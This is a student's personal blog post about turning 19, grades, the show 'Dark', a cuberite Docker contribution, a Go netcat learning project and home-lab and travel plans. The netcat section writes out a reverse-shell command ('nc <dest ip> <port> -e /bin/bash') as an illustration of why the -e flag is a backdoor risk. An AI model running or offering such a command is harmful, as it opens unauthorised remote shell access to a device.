---
layout: single
title: "End of beginning"
author_profile: true
date: 2025-12-19
categories:
  - ChitChat
classes: wide
header:
  teaser: "/assets/2025-12-19-resources/teaser.jpg"
---

> <iframe data-testid="embed-iframe" style="border-radius:12px" src="https://open.spotify.com/embed/track/3qhlB30KknSejmIvZZLjOD?utm_source=generator" width="100%" height="200" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
> A song I recently like

## Every Action comes with an consequence

After I decided to live in the moment back in September, the consequences came quickly.
December has arrived, would
there be a miracle in the rest 11 days to save me from reality?

Back to todays topic, end of beginning. Why do I choose this header?

1. December is my birthday month, and I turned 19, which I realized my joyful childhood
has came to an end. End of 18 years of child life, what waiting for me is the next 10 years of new era.
I little bit sad.

2. From 2025 spring term, I tried so hard to improve my GPA. And after all that
hard works, I improved **0.01**. So I wondered, what is the necessity of studying so hard?
To fulfil my ego? Thus this term I decided to live the moment, and consequences came.
I have an answer now, to make me feel good, get a below median do hurts. End of my
experiment of living the moment. **Reserve a seat for myself in library.**

3. I am watching "Dark", that famous show. It really inspired me of thinking about time,
and Causality. The "dark world" is really fascinating, a circled timeline. Past effects future,
and future effects past, like past and future are if and only if relationships. When is end?
When is beginning? End of beginning should be end **and** beginning.

<figure style="text-align:center;">
  <img src="/assets/2025-12-19-resources/whiskey.jpg" alt="Thai food" style="width:50%;max-width:440px;display:block;margin:0 auto;" />
</figure>
<div style="text-align:center; font-size:0.85rem;color:#64748b;margin-top:.4rem;">Bar at coast</div>

This term, I did not take too much photos. It feels like September and October slipped away
in a sudden, while November are surprisingly slow.

## What I've been doing

### My first PR contribute to public repo

I am making docker container support for [cuberite](https://github.com/cuberite/cuberite/pull/5621),
a community version of minecraft server. The server only supports up to 1.14 version of minecraft,
it is a major drawback. But in contrast to official server, it is written in C++, giving high performance
comparing to java server. It can run easily on a raspberry pi. This server is missing container shipping,
therefore I am writing one.

> An annoying thing is the CI, MSVC build failed, but clang and g++ on ubuntu has no problem.

### Netcat implemented in Golang

I am new to golang, it is used widely in network scenarios, concurrency has made go unique.
There are people already implemented netcat in golang, mine is for learning go. Here is the repo,
[netcat-go](https://github.com/ZihaoFU245/netcat-go). Some basic features are ready to use, while
some fancy ones, like hexdump, file sharing, is not yet ready.

Netcat `-e` flag in history is considered as a backdoor, which can act like a reverse shell.
`nc <dest ip> <port> -e /bin/bash`, this can act like a backdoor. 50 lines of code can make your
device insecure.

### Remotely playing PS5

I am thinking of a way to remotely playing PS5 in low latency. The official PS remote app
is dummy, even under a VPN which is Layer 3, it can not find PS5 machine, and traffic will be routed
through Sony's server giving higher latency and introduce instability. If PS5 is directly exposed
in public internet, then it will be direct, but under most cases, it is behind a NAT.

I will be setting up PS5 in my madrid house, and use chiaki, a community PS remote application,
which support a direct ip connection. I can utilize my tailnet, to give a direct connection.

Inspired by this, I have bought a HDMI video capture card. Combined with a remote IR control

## What I gonna do in winter holiday

### Home Lab Set up

I will be setting up my own home lab in Madrid. A usual home lab, you could possibly think of,
require powerful CPUs or 4090s. Mine is much shallower, a raspberry pi. I small raspberry pi
with a public ipv4 can be way powerful then you think. Set up services that only used by few people,
VPNs, remote control, minecraft server (I would use an old thinkbook laptop more likely), etc.

### Switch to Linux (Ubuntu)

I am quite tired of using windows. Windows file systems, services, powershell, cmd, etc, are
not as easy as Unix I personally believe. With the power of Wine and Proton, developed by valve,
I can play my games on Linux as well.

### Traveling

Dec 22th to 25th, I will be Nice, France. Jan 1th to 8th I will go to Denmark and Norway, mainly go
to watch northern lights. By that time, I will have posted a travel blog contained my best photos.

---

> I do feel this term one reason I didn't get good grades is because I focus on too much on my
personal hobbies

> I have decided to separate technical blogs with general chitchat blogs, with better focus.
